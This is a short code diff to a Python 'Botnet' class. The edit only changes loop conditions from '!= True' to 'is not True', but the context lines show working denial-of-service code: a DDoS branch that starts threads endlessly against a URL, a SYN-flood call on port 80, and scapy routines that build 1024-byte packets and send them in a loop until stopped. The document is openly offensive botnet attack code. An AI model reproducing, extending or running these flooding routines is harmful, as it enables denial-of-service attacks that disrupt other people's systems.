@@ -127,7 +127,7 @@ class Botnet:
             pass
 
         if type == "$DDoS":
-            while self.stopAttbool != True:
+            while self.stopAttbool is not True:
                 threading.Thread(target=self.distributed_denial_of_service_attack, args=[url]).start()
         elif type == "$SynFlooding":
             self.syn_flooding(url, 80)
@@ -150,7 +150,7 @@ class Botnet:
         raw = Raw(b"X" * 1024)
 
         packet = ip / tcp / raw
-        while self.stopAttbool != True:
+        while self.stopAttbool is not True:
             send(packet)
 
     def ping_flooding(self, target):
@@ -162,7 +162,7 @@ class Botnet:
         raw = Raw(b"X" * 1024)
 
         packet = ip / tcp / raw
-        while self.stopAttbool != True:
+        while self.stopAttbool is not True:
             send(packet)
 
 bot = Botnet()
